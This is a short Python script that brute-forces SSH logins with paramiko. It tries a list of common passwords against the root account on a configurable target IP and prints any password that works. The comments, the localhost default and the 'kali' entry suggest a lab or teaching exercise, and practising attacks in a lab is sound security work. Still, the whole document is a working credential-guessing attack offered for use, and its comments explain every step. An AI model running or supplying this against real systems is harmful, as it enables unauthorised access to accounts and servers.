import paramiko
import socket # Used to handle connection timeouts

def ssh_brute_force(host, username, password):
    client = paramiko.SSHClient()
    
    # This line tells the script to automatically accept the server's "SSH Key"
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Try to connect
        client.connect(hostname=host, username=username, password=password, timeout=3)
    except paramiko.AuthenticationException:
        # This means the password was WRONG
        return False
    except socket.error:
        # This means the server is down or blocking us
        print("[!] Connection Error: Is the IP correct?")
        return False
    else:
        # This runs if NO error occurred
        print(f"[+] Success! Valid Password: {password}")
        return True
    finally:
        client.close()

# --- SETUP ---
target_ip = "127.0.0.1" #10.0.2.15" # Change to your target's IP
user = "root"
passwords = ["123456", "admin", "password", "kali", "dragon"]

for pw in passwords:
    print(f"[*] Trying: {pw}")
    if ssh_brute_force(target_ip, user, pw):
        break # Stop the loop if we find it

